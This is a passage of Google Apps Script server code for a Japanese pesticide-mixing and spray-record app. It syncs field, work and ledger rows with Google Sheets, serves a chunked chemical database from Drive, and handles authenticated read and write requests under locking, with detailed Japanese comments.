      const i = idx[key];
      const prevEdit = String(rows[i][editCol] || "");
      const newEdit = String(item.updatedAt || "");
      if (newEdit && prevEdit && newEdit < prevEdit) {
        skipped++;
        continue;
      }
      if (logKind) {
        logs.push([at, safeCell_(team), safeCell_(item.by || ""),
                   safeCell_(logKind + " " + JSON.stringify(rows[i]))]);
      }
      rows[i] = values;
      updated++;
    } else {
      idx[key] = rows.length;
      rows.push(values);
      added++;
    }
  }

  if (updated > 0 || added > 0 || purged > 0) {
    ensureRows_(sh, rows.length + 1);   // +1 は見出し行
    sh.getRange(2, 1, rows.length, width).setValues(rows);
    // 掃除で減ったぶん、下に古い行が残る。行ごと消す
    const extra = (last - 1) - rows.length;
    if (extra > 0) sh.deleteRows(2 + rows.length, extra);
  }
  pushRecLogs_(logs);
  return { ok: true, added: added, updated: updated, skipped: skipped, purged: purged, serverTime: at };
}

// ── 差分取得:since より後にサーバーが書いた行だけ返す ──
// ── 列を1本だけ先に読んで、要る行の範囲を決めてから本体を読む ──
//
// なぜ必要か:
//   進捗も差分取得も、実際に要るのは一部の行だけなのに、
//   これまでは毎回 getRange(2, 1, 全行, 全列) で丸ごと読んでいた。
//   170圃場を100日分とると 17,000行×24列 = 408,000セルを、
//   510件を返すために 30秒ごとに読んでいた(実測)。
//
// やり方:
//   1. 鍵になる列(作業日 / 更新日時)だけを1列読む。Nセル。
//   2. 条件に合う行番号の最小と最大を出す。
//   3. その範囲だけを getRange で一度に読む。
//
// 行を散らばって getRange を何回も呼ばないのは、GAS では
// 呼び出し1回ごとの往復が高く、細かく分けるとかえって遅いため。
// 作業行は日付順に追記されるので、実際にはほぼ連続している。
// 連続していなくても、最悪でも今までと同じ(全行読み)になるだけで、
// 遅くなることはない。
//
// 戻り値は { rows, offset }。offset は rows[0] がシートの何行目か(1始まり)。
function scanRows_(sh, headers, keyCol0, keep) {
  const last = sh.getLastRow();
  if (last < 2) return { rows: [], offset: 0 };
  const n = last - 1;
  const keys = sh.getRange(2, keyCol0 + 1, n, 1).getValues();
  let lo = -1, hi = -1;
  for (let i = 0; i < n; i++) {
    if (!keep(keys[i][0])) continue;
    if (lo < 0) lo = i;
    hi = i;
  }
  if (lo < 0) return { rows: [], offset: 0 };
  const rows = sh.getRange(2 + lo, 1, hi - lo + 1, headers.length).getValues();
  return { rows: rows, offset: 2 + lo };
}

function pullRows_(sh, headers, atCol, team, since, mapper) {
  const s = String(since || "");
  // 更新日時の列だけを先に見る。30秒ごとの定期取得では
  // 何も変わっていないことがほとんどで、そのときはここで終わる。
  const hit = scanRows_(sh, headers, atCol, v => !s || atIso_(v) > s);
  const out = [];
  for (let i = 0; i < hit.rows.length; i++) {
    const r = hit.rows[i];
    if (!r[0] && r[0] !== 0) continue;              // 空行
    if (team && String(r[1]) !== String(team)) continue;
    if (s && atIso_(r[atCol]) <= s) continue;
    out.push(mapper(r));
  }
  return out;
}

// ── 進捗マップ用の軽い応答 ──
// ポリゴンを返さない。座標は各端末が既に持っていて、地図が要るのは
// 「どの圃場が何色か」だけ。応答が小さいほど電波の弱い場所でも通る。
function progressItems_(team, from, to) {
  const sh = getWorkSheet_();
  // 作業日の列(0始まり2)だけを先に見て、見る日の範囲に絞る。
  // 進捗地図が見るのは直近3日だけなのに、全期間を読んでいた
  const hit = scanRows_(sh, WORK_HEADERS, 2, v => {
    const d = ymd_(v);
    if (from && d < from) return false;
    if (to && d > to) return false;
    return true;
  });
  const rows = hit.rows;
  const out = [];
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    if (!r[0] && r[0] !== 0) continue;
    if (team && String(r[1]) !== String(team)) continue;
    if (r[16]) continue;                            // 削除済み
    const d = ymd_(r[2]);
    if (from && d < from) continue;
    if (to && d > to) continue;
    out.push({
      // 作業ID。これが無いと、端末側に残っていない行を
      // アプリから消せない(墓標を立てる先が分からない)。
      // 進捗だけ見ていたので長らく抜けていた(v8.80)
      id: r[0],
      fieldId: Number(r[3]),
      workDate: d,
      status: String(r[5] || "planned"),
      sprayedL: r[7] === "" ? 0 : Number(r[7]),
      areaA: r[8] === "" ? "" : Number(r[8]),
      by: String(r[11] || ""),
      // 実績入力日。r[13] が空のときは更新日時で代用するが、
      // そちらは ISO の時刻文字列や Date のままのことがある。
      // String() でそのまま返すと、進捗地図の吹き出しに
      // "Thu Aug 27 2026 00:00:00 GMT+0900 (日本標準時)" がそのまま出る。
      // 両方とも ymd_ を通して日付の形に揃える。
      at: ymd_(r[13]) || ymd_(r[WORK_AT_COL]) || "",
      // 刻まで入った実績入力時刻。同じ日に2人が同じ圃場を済ませたとき、
      // どちらが先かをこれで決める。at は日付に丸めていて先後が分からない。
      // 古い行は日付しか入っていないので、空や日付だけもありうる(v8.97)。
      atTime: atIso_(r[13]),
    });
  }
  return out;
}

// ══════════ 農薬データ(chemdb.json)の配信 ══════════
// Googleドライブに置いた chemdb.json を読み、分割して返す。
// アプリ側は part=0 から順に呼び、chunk を連結して JSON.parse する。
//
// なぜ分割するのか:
//   chemdb.json は約940KB。ContentService が1回の応答で返せる大きさの上限は
//   公式に明示されておらず、環境によって変わりうる。1回で返す前提で作ると
//   「ある人の環境では動くが、ある人の環境では無言で切れる」という最悪の壊れ方をする。
//   最初から分割して返せば、上限がいくつであっても既定の25万文字が通れば動く。

const CHEMDB_DEFAULT_CHUNK = 250000; // 1パートの文字数(コードユニット)の既定値
const CHEMDB_MAX_CHUNK = 400000;     // 端末から大きすぎる値を指定されても、ここで頭打ちにする

// 配信するファイルを特定する。スクリプトプロパティ CHEMDB_FILE_ID を優先し、
// 未設定ならドライブ内の "chemdb.json" という名前のファイルにフォールバックする。
// 見つからなければ null。
function chemdbFile_() {
  const id = PropertiesService.getScriptProperties().getProperty("CHEMDB_FILE_ID");
  if (id) {
    try {
      return DriveApp.getFileById(String(id).trim());
    } catch (err) {
      // IDの打ち間違い・削除済み・権限なし。名前での検索に落として復旧の芽を残す。
      // 詳細(err)は返さない。ドライブの内部事情を外に出す必要がない。
    }
  }
  const it = DriveApp.getFilesByName("chemdb.json");
  return it.hasNext() ? it.next() : null;
}

// ── キャッシュしない判断について ──
// 毎回ドライブから読み直すのは遅い(1パートごとに1回読む)。CacheService に載せられれば
// 速くなるが、CacheService は1項目100KBが上限。chemdb.json は約940KB、1パートでも
// 25万文字(UTF-8で数百KB)あり、全体はもちろん1パートすら入らない。
// 100KB未満に切り刻んで10数個のキーに分けて入れることは理屈上は可能だが、
// 一部だけ失効したときに古い断片と新しい断片が混ざり、壊れたJSONを配ってしまう。
// 取り込みは各端末で数か月に1回の操作なので、速度より確実さを取ってキャッシュしない。

// part 番目のチャンクを返す。
function chemdbChunk_(part, size) {
  const file = chemdbFile_();
  if (!file) return { ok: false, error: "chemdb not found" };

  // getDataAsString("UTF-8") でバイト列を文字列にしてから切る。
  // バイト単位で切ると日本語(UTF-8で3バイト)が途中で割れて壊れるため、必ず文字列にしてから切る。
  const text = file.getBlob().getDataAsString("UTF-8");
  const len = text.length; // JSの文字列長 = UTF-16コードユニット数

  let step = Math.floor(Number(size) || CHEMDB_DEFAULT_CHUNK);
  if (!(step > 0)) step = CHEMDB_DEFAULT_CHUNK;
  if (step > CHEMDB_MAX_CHUNK) step = CHEMDB_MAX_CHUNK;

  const n = Math.max(0, Math.floor(Number(part) || 0));
  let start = n * step;
  if (start >= len) return { ok: false, error: "part out of range" };
  let end = Math.min(start + step, len);

  // ── サロゲートペアを割らない ──
  // substring はコードユニット単位なので、境界がサロゲートペアの真ん中に来ると
  // 上位・下位が別パートに分かれ、連結する前の各チャンクが壊れた文字を含む。
  // (連結すれば元に戻るとはいえ、途中で文字数を数えたりログに出したりすると化ける)
  // 境界の直前が上位サロゲート(U+D800〜U+DBFF)なら1つ手前で切り、下位サロゲートを次のパートへ送る。
  // start 側は「前のパートが同じ規則で切った位置」と一致させる必要があるので、同じ判定を行う。
  const backOffIfSplit = (pos) => {
    if (pos <= 0 || pos >= len) return pos;
    const c = text.charCodeAt(pos - 1);
    return (c >= 0xD800 && c <= 0xDBFF) ? pos - 1 : pos;
  };
  start = backOffIfSplit(start);
  end = backOffIfSplit(end);

  // 全パート数。境界がずれても1文字ぶんなので、切り上げで数えた値とパート番号は必ず一致する
  // (ずれるのは各パートの長さだけで、step 文字ずつ進む点は変わらない)。
  const total = Math.max(1, Math.ceil(len / step));
  return {
    ok: true,
    part: n,
    total: total,
    // bytes = ファイルのバイト数(進捗表示・整合確認用)。分割の基準は文字数なので
    // chars も返す。日本語が多いぶん bytes は chars の2〜3倍になる。
    bytes: file.getSize(),
    chars: len,
    chunk: text.substring(start, end)
  };
}

// 薬剤リストを1セル用の文字列にまとめる(用途・剤型・倍率・薬量)
// 薬剤名はユーザーが自由に入力できる(プリセット名)ので、
// 連結後の文字列を safeCell_ に通してから返す。
function chemsText_(chems) {
  return safeCell_(chems.map(function (c) {
    var parts = [];
    if (c.useName) parts.push(c.useName);
    if (c.formName) parts.push(c.formName);
    parts.push((c.ratio || "?") + "倍");
    parts.push(Math.round(Number(c.ml) || 0) + "mL");
    return (c.name || "(無名)") + "(" + parts.join("・") + ")";
  }).join(" / "));
}

// 1散布ぶんの行データを作る
// ── 台帳(防除記録)の1件を反映する ──
//
// record / report / unreport の中身。単体でもまとめ送り(pushRecords)でも
// 同じここを通す。二重に書くと、片方だけ直して振る舞いがずれる。
//
// 呼び側がロックを取っていること。ここでは取らない。
function applyRecord_(sh, op, rec, team, recorder) {
  if (!rec || !rec.id) return { ok: false, error: "invalid payload" };
  if (op === "record" && !Array.isArray(rec.chems)) return { ok: false, error: "invalid payload" };
  const row = findRow_(sh, rec.id, team);
  // 第2段で拾ったチーム欄が空の行は、ここで自分のチームのものとして確定させる
  if (row > 0) claimRow_(sh, row, team);
  const data = { record: rec, team: team, recorder: recorder };

  if (op === "record") {
    // 既に行がある場合は薬剤の内容だけ上書きする。
    // (実績入力のあとから薬剤を適用したケースを反映するため。行は増やさない)
    if (row > 0) {
      sh.getRange(row, COL.CHEM_N, 1, 4).setValues([[
        rec.chems.length,
        chemsText_(rec.chems),
        Number(rec.totalL) || 0,
        Math.round(Number(rec.waterMl) || 0) / 1000,
      ]]);
      return { ok: true, updated: 1, chemsOnly: true };
    }
    sh.appendRow(buildRow_(data, "調合済"));
    return { ok: true, added: 1 };
  }

  // ── 実績の取り消し ──
  // 作業タブのチェックを外したとき。行は消さない(調合した事実は残るため)。
  // 状態を「調合済」に戻し、実散布量と報告日だけを消す。
  if (op === "unreport") {
    if (row <= 0) {
      // 元の行が無い(まだ一度も送っていない)。取り消すものが無いので成功扱い。
      // ここで失敗を返すと、アプリ側が永久に再送を続ける
      return { ok: true, updated: 0, missing: true };
    }
    sh.getRange(row, COL.SPRAYED).setValue("");
    sh.getRange(row, COL.STATUS).setValue("調合済");
    sh.getRange(row, COL.REPORT_DATE).setValue("");
    return { ok: true, updated: 1 };
  }

  if (op === "report") {
    if (row > 0) {
      sh.getRange(row, COL.SPRAYED).setValue(Number(rec.sprayedL) || "");
      sh.getRange(row, COL.STATUS).setValue("散布済");
      sh.getRange(row, COL.REPORT_DATE).setValue(safeCell_(rec.reportDate || ""));
      if (rec.reportAreaA) sh.getRange(row, COL.AREA).setValue(Number(rec.reportAreaA) || "");
      if (rec.reportMemo) sh.getRange(row, COL.MEMO).setValue(safeCell_(rec.reportMemo));
      return { ok: true, updated: 1 };
    }
    // 元の記録が見つからない場合は報告内容ごと新規追加(取りこぼし防止)
    sh.appendRow(buildRow_(data, "散布済"));
    return { ok: true, added: 1 };
  }
  return { ok: false, error: "unknown type" };
}

function buildRow_(data, status) {
  const rec = data.record;
  const now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  // 文字列の項目は safeCell_ を通す(数式インジェクション対策)。
  // 数値の項目は Number() を通しているので、数式になりようがない。
  return [
    now,
    safeCell_(String(rec.id)),
    safeCell_(rec.date || ""),
    safeCell_(data.recorder || ""),
    safeCell_(rec.field || ""),
    safeCell_(rec.crop || ""),
    Number(rec.reportAreaA || rec.areaA) || "",
    rec.chems.length,
    chemsText_(rec.chems),
    Number(rec.totalL) || 0,
    Math.round(Number(rec.waterMl) || 0) / 1000, // mL→L
    status === "散布済" ? (Number(rec.sprayedL) || "") : "",
    status,
    safeCell_(status === "散布済" ? (rec.reportDate || "") : ""),
    safeCell_((status === "散布済" ? (rec.reportMemo || rec.memo) : rec.memo) || ""),
    safeCell_(String(data.team || "")),
  ];
}

// ══════════ 台帳を作業シートから作る(提案D・第2段) ══════════
//
// 「防除記録」シートの列は、すべて「作業」シートにもある。
//   受信日時→更新日時 / 記録ID→作業ID / 散布日→作業日 / 記録者→記録者 /
//   圃場→圃場名 / 作物→作物 / 面積→実績面積a か 面積a / 薬剤数→薬剤数 /
//   薬剤内容→薬剤内容 / 総量→総量L / 水量→水量mL÷1000 / 実散布量→実績L /
//   状態→状態(done なら散布済) / 報告日→実績入力日時 / 備考→実績メモ か 備考 /
//   チームコード→チームコード
// 記録IDと作業IDは同じもの(どちらもアプリが日付＋圃場IDから決める)。
// 最後に残っていた「実績メモ」も v9.04 で作業シートに足した。
//
// つまり台帳は作業シートから作り直せる。そうすれば、
//   ・端末が record / report / unreport を送る必要がなくなる
//   ・作業シートと台帳が食い違うことがなくなる(今は別々に書いている)
// が、台帳は人が読む・印刷する「元帳」なので、確かめずに切り替えない。
// ここでは作るだけ。今の台帳と突き合わせる ledgerCheck から使う。
//
// ★ここに書き込む処理を足さないこと。読み取り(doRead_)から呼ぶため、
//   ロックを取らずに走る。
function ledgerRowFromWork_(r) {
  const done = String(r[5] || "") === "done";
  // 面積は実績面積を優先する。実績が入っていなければ登録上の面積。
  // 台帳の buildRow_ / report と同じ順番にすること
  const area = Number(r[8]) || Number(r[18]) || "";
  return [
    // 受信日時。台帳は「受け取った時刻」、作業シートは「更新日時」。
    // どちらも「サーバーが最後に書いた時刻」なので同じものを指す
    atIso_(r[WORK_AT_COL]),
    String(r[0]),
    ymd_(r[2]),
    String(r[11] || ""),
    String(r[4] || ""),
    String(r[17] || ""),
    area,
    Number(r[9]) || 0,
    String(r[10] || ""),
    Number(r[20]) || 0,
    Math.round(Number(r[21]) || 0) / 1000, // mL→L
    done ? (Number(r[7]) || "") : "",
    done ? "散布済" : "調合済",
    done ? ymd_(r[13]) : "",
    // 散布済のときは実績メモを優先する(台帳の buildRow_ と同じ)
    String((done ? (r[24] || r[22]) : r[22]) || ""),
    String(r[1] || ""),
  ];
}

// 台帳の1行を、突き合わせできる形にそろえる。
// シートから読むと数値が Date や文字列で返ることがあるので、
// 見た目の値ではなく「同じ意味か」で比べる。
const LEDGER_NUM_COLS = [6, 7, 9, 10, 11];   // 面積 / 薬剤数 / 総量 / 水量 / 実散布量
const LEDGER_DATE_COLS = [2, 13];            // 散布日 / 報告日
// 受信日時(0)は比べない。台帳は「その行を書いた時刻」、作業シートは
// 「その作業を最後に書いた時刻」で、同じ行でも必ずずれる。
// 台帳を作り直す判断には関係しない。
const LEDGER_SKIP_COLS = [0];
function ledgerNorm_(row) {
  const out = [];
  for (let i = 0; i < HEADERS.length; i++) {
    if (LEDGER_SKIP_COLS.indexOf(i) >= 0) { out.push(""); continue; }
    const v = row[i];
    if (LEDGER_DATE_COLS.indexOf(i) >= 0) { out.push(ymd_(v) || ""); continue; }
    if (LEDGER_NUM_COLS.indexOf(i) >= 0) {
      const n = Number(v);
      out.push(v === "" || v === null || v === undefined || isNaN(n) ? "" : String(n));
      continue;
    }
    // 数式インジェクション対策で先頭に付くアポストロフィは、
    // getValue では返らない。ここでは素の文字列として比べる
    out.push(String(v == null ? "" : v));
  }
  return out;
}

// 今の台帳と、作業シートから作り直した台帳を突き合わせる。読み取りだけ。
// 返すのは件数と、違いの見本(最大20件)。
function ledgerCheck_(team) {
  const wk = getWorkSheet_();
  const lg = getSheet_();
  const made = {};   // 記録ID → 作り直した行
  if (wk.getLastRow() >= 2) {
    const rows = wk.getRange(2, 1, wk.getLastRow() - 1, WORK_HEADERS.length).getValues();
    for (let i = 0; i < rows.length; i++) {
      const r = rows[i];
      if (!r[0] && r[0] !== 0) continue;
      if (team && String(r[1]) !== String(team)) continue;
      if (r[16]) continue; // 削除済み
      made[String(r[0])] = ledgerRowFromWork_(r);
    }
  }
  const have = {};
  if (lg.getLastRow() >= 2) {
    const rows = lg.getRange(2, 1, lg.getLastRow() - 1, HEADERS.length).getValues();
    for (let i = 0; i < rows.length; i++) {
      const r = rows[i];
      if (!r[COL.ID - 1] && r[COL.ID - 1] !== 0) continue;
      const rt = String(r[COL.TEAM - 1] == null ? "" : r[COL.TEAM - 1]);
      // チーム欄が空の行は古い行。どのチームのものか分からないので、
      // 突き合わせの対象には入れるが、チーム違いとしては数えない
      if (team && rt && rt !== String(team)) continue;
      have[String(r[COL.ID - 1])] = r;
    }
  }
  const sample = [];
  let same = 0, differ = 0, onlyWork = 0, onlyLedger = 0;
  const push = o => { if (sample.length < 20) sample.push(o); };
  for (const id in made) {
    if (!have[id]) { onlyWork++; push({ id: id, why: "台帳に無い" }); continue; }
    const a = ledgerNorm_(made[id]);
    const b = ledgerNorm_(have[id]);
    let hit = -1;
    for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) { hit = i; break; }
    if (hit < 0) { same++; continue; }
    differ++;
    push({ id: id, why: HEADERS[hit], made: a[hit], ledger: b[hit] });
  }
  for (const id in have) {
    if (!made[id]) { onlyLedger++; push({ id: id, why: "作業シートに無い" }); }
  }
  return {
    same: same, differ: differ,
    onlyWork: onlyWork, onlyLedger: onlyLedger,
    sample: sample,
  };
}

// ── 読み取り専用の処理 ──
// 呼び出し元(doPost)で合言葉の照合を済ませてから入る。ここでは認証しない。
// シートに書き込む処理を絶対に足さないこと。ロックを取らずに走るため、
// ここで書くと他の端末の書き込みと競合してデータが壊れる。
function doRead_(type, data) {
  if (type === "chemdbLoad") {
    return json_(chemdbChunk_(data.part, data.size));
  }

  if (type === "cloudLoad") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const sh = getShareSheet_();
    const row = findShareRow_(sh, data.team);
    if (row <= 0) return json_({ ok: true, payload: null });
    const payload = sh.getRange(row, 2).getValue();
    return json_({ ok: true, payload: payload || null });
  }

  if (type === "pull") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const since = String(data.since || "");
    // serverTime は「この応答が含む範囲の終わり」。次回の since に使う。
    // 読む前に採っておく。読んだ後に採ると、読んでいる最中に書かれた行を
    // 永久に取りこぼす。
    // さらに PULL_LAG_MS ぶん手前にずらす。理由は定義側のコメントを参照。
    const serverTime = new Date(Date.now() - PULL_LAG_MS).toISOString();
    return json_({
      ok: true,
      fields: pullRows_(getFieldSheet_(), FIELD_HEADERS, FIELD_AT_COL, data.team, since, fieldObj_),
      works:  pullRows_(getWorkSheet_(),  WORK_HEADERS,  WORK_AT_COL,  data.team, since, workObj_),
      chems:  pullRows_(getChemSheet_(),  CHEM_HEADERS,  CHEM_AT_COL,  data.team, since, chemObj_),
      // 作業に「その日の予定」を組み直せる中身(薬剤JSON・作物・面積・並び順)が
      // 入っている印。古いGASはこれを返さないので、アプリは作業を取り込まない。
      // 無いまま取り込むと、手元の薬剤の中身が空で上書きされる。
      plan: true,
      serverTime: serverTime,
    });
  }

  if (type === "progress") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const from = String(data.from || data.date || "");
    const to = String(data.to || data.date || "");
    return json_({
      ok: true,
      items: progressItems_(data.team, from, to),
      serverTime: isoNow_(),
    });
  }

  // 台帳を作業シートから作り直せるかの下見(提案D)。書き込みはしない。
  // シートを丸ごと2枚読むので、自動では呼ばない。設定タブのボタンから手で呼ぶ。
  if (type === "ledgerCheck") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const r = ledgerCheck_(data.team);
    r.ok = true;
    return json_(r);
  }

  return json_({ ok: false, error: "unknown type" });
}

// ── 受信(アプリからのPOST) ──
function doPost(e) {
  // ── 読み取りだけのリクエストはロックを取らずに先に処理する ──
  // 以前は全種類がスクリプトロックを取っていた。進捗マップの「最新を取得」は
  // 散布中に何度も押されるが、そのとき他の端末が実績を送っていると
  // ロック待ちで10秒たって "busy" が返る。読むだけの処理は他と競合しないので、
  // 書き込み系より前で返してしまう。
  let head = null;
  try {
    head = JSON.parse(e.postData.contents);
  } catch (err) {
    return json_({ ok: false, error: "invalid json" });
  }
  const headSecret = sharedSecret_();
  if (headSecret && !secretEquals_(headSecret, head.auth)) {
    return json_({ ok: false, error: "auth" });
  }
  const headType = head.type || "record";
  if (headType === "pull" || headType === "progress" || headType === "cloudLoad" ||
      headType === "ledgerCheck" ||
      headType === "chemdbLoad") {
    try {
      return doRead_(headType, head);
    } catch (err) {
      return json_({ ok: false, error: String(err) });
    }
  }

  const lock = LockService.getScriptLock();
  // tryLock はロックを取れなくても例外を投げない。以前は waitLock を try の外で
  // 呼んでいたため、取得に失敗すると finally の releaseLock() が
  // 「ロックを持っていない」という二次例外を出し、本当の原因が隠れていた。
  if (!lock.tryLock(10000)) {
    // 他の端末の送信と競合しただけ。アプリ側は未送信のまま再送すればよい。
    return json_({ ok: false, error: "busy" });
  }
  try {
    const data = JSON.parse(e.postData.contents);

    // ── 合言葉の照合 ──
    // スクリプトプロパティ SHARED_SECRET が設定されているときだけ検証する。
    // 未設定の既存デプロイをいきなり弾くと現場の記録が止まるため、後方互換を優先。
    const secret = sharedSecret_();
    if (secret && !secretEquals_(secret, data.auth)) {
      // 何が違うか(未設定なのか不一致なのか)は返さない。総当たりの手がかりになる。
      return json_({ ok: false, error: "auth" });
    }

    const type = data.type || "record";

    // 読み取り専用の種類(chemdbLoad / cloudLoad / pull / progress)は
    // ロックを取る前に doRead_ で処理済み。ここには来ない。

    // ── チーム共有:圃場・薬剤・作業リストのまとめ保存/読込 ──
    // 専用シート「_共有データ」に保存(PropertiesServiceの9KB上限を回避)
    if (type === "cloudSave") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const sh = getShareSheet_();
      const row = findShareRow_(sh, data.team);
      const payload = String(data.payload || "");
      // スプレッドシートの1セルは50000文字が上限。超えると切り捨て、あるいは
      // 書き込み自体が失敗して、次の cloudLoad で壊れたJSONが返る(無言のデータ破損)。
      // 余裕を見て45000文字で断り、アプリ側に「保存できなかった」と伝える。
      if (payload.length > 45000) {
        return json_({ ok: false, error: "データが大きすぎます(セル上限)" });
      }
      const when = new Date();
      if (row > 0) {
        // 上書きする前に、いまの値を履歴シートへ退避する
        pushShareLog_(data.team, data.by, sh.getRange(row, 2).getValue(), when);
        // payload はアプリが作るJSON文字列だが、"=" 始まりの値を作られると
        // セルが数式として評価されてしまう。読み出し側で困るので文字列に固定する。
        sh.getRange(row, 2).setValue(safeCell_(payload));
        sh.getRange(row, 3).setValue(when);
        sh.getRange(row, 4).setValue(safeCell_(data.by || ""));
      } else {
        sh.appendRow([safeCell_(data.team), safeCell_(payload), when, safeCell_(data.by || "")]);
      }
      return json_({ ok: true, saved: true, size: payload.length });
    }
    // ── 進捗共有(レコード単位) ──
    // cloudSave/cloudLoad と違い、送った件数ぶんだけを反映する。
    // 他の端末が入れた圃場・実績には触らない。
    if (type === "pushFields" || type === "pushWorks" || type === "pushChems") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const list = data.items;
      if (!Array.isArray(list)) return json_({ ok: false, error: "items required" });
      // 多すぎるぶんを黙って捨てると、送った側は成功したと思って再送しない。
      // 件数を返して、アプリ側に分割して送り直させる。
      if (list.length > PUSH_MAX) {
        return json_({ ok: false, error: "too many", max: PUSH_MAX, got: list.length });
      }
      if (type === "pushFields") {
        return json_(upsertRows_(getFieldSheet_(), FIELD_HEADERS, FIELD_ID_COL, FIELD_EDIT_COL,
                                 list, fieldRow_, data.team, "圃場"));
      }
      if (type === "pushChems") {
        return json_(upsertRows_(getChemSheet_(), CHEM_HEADERS, CHEM_ID_COL, CHEM_EDIT_COL,
                                 list, chemRow_, data.team, null));
      }
      return json_(upsertRows_(getWorkSheet_(), WORK_HEADERS, WORK_ID_COL, WORK_EDIT_COL,
                               list, workRow_, data.team, null));
    }

    // ── 台帳へのまとめ送り(v8.98) ──
    // 従来は圃場1枚につき record と report で別々に送っていた。
    // 170圃場に実績を入れた日は 340回を直列で往復していた。
    // 順序は送られてきたまま守る(record → unreport → report の並びを
    // アプリ側が作っている。ここで並べ替えると取り消しが後勝ちになる)。
    if (type === "pushRecords") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const list = data.items;
      if (!Array.isArray(list)) return json_({ ok: false, error: "items required" });
      if (list.length > PUSH_MAX) {
        return json_({ ok: false, error: "too many", max: PUSH_MAX, got: list.length });
      }
      const sh = getSheet_();
      const team = String(data.team || "");
      const results = [];
      let touched = false;
      for (let i = 0; i < list.length; i++) {
        const it = list[i] || {};
        const r = applyRecord_(sh, String(it.op || ""), it.record, team, data.recorder);
        // 色分けが要るのは行を足したときだけ。既存行の更新では作業日は変わらない
        if (r.added) touched = true;
        results.push({ id: it.record && it.record.id, op: it.op, ok: !!r.ok, error: r.error || "" });
      }
      // 日付の色分けは行を足したあとに1度だけ。
      // 1件ごとに呼ぶと、まとめ送りにした意味がなくなる
      if (touched) colorByDate_(sh);
      return json_({ ok: true, results: results });
    }

    // 種類の判定を先にする(v9.05)。
    // ここが後ろだと、知らない種類はすべて record の中身の検査に落ちて
    // 「invalid payload」になる。アプリ側は「unknown type」を
    // 「動いているGASが古い」の目印にしているので、古いのに古いと分からず
    // 「送ったものが壊れている」と読める案内が出る。
    // 実際、v9.04 で足した ledgerCheck を古いGASに送ると、そうなった。
    if (type !== "record" && type !== "report" && type !== "unreport") {
      return json_({ ok: false, error: "unknown type" });
    }
    const rec = data.record;
    if (!rec || !rec.id || (type === "record" && !Array.isArray(rec.chems))) {
      return json_({ ok: false, error: "invalid payload" });
    }
    const sh = getSheet_();
    const r = applyRecord_(sh, type, rec, String(data.team || ""), data.recorder);
    // 色分けは行を足したときだけ(従来と同じ)
    if (r.added) colorByDate_(sh);
    return json_(r);
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

// ── 接続テスト(アプリの「接続テスト」ボタンからのGET) ──
function doGet() {
  // secured は「合言葉が設定済みか」。false のときアプリ側で
  // 「合言葉が未設定です」と出せるようにするための情報で、合言葉そのものは返さない。
  return json_({
    ok: true,
    app: "薬液調合ノート 受信口 v10(1散布=1行・進捗共有・実績取消対応)",
    sheet: SHEET_NAME,
    secured: !!sharedSecret_(),
    // アプリ側が「このGASは進捗マップに対応しているか」を判定するための印。
    // 古いGASのまま進捗マップを開くと unknown type が返るだけで理由が分からない。
    features: ["record", "report", "unreport", "chemdbLoad", "cloudSave", "cloudLoad",
               "pushFields", "pushWorks", "pushChems", "pull", "progress", "workPlan",
               "ledgerCheck", "workReportMemo",
               "pushRecords"],
  });
}

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
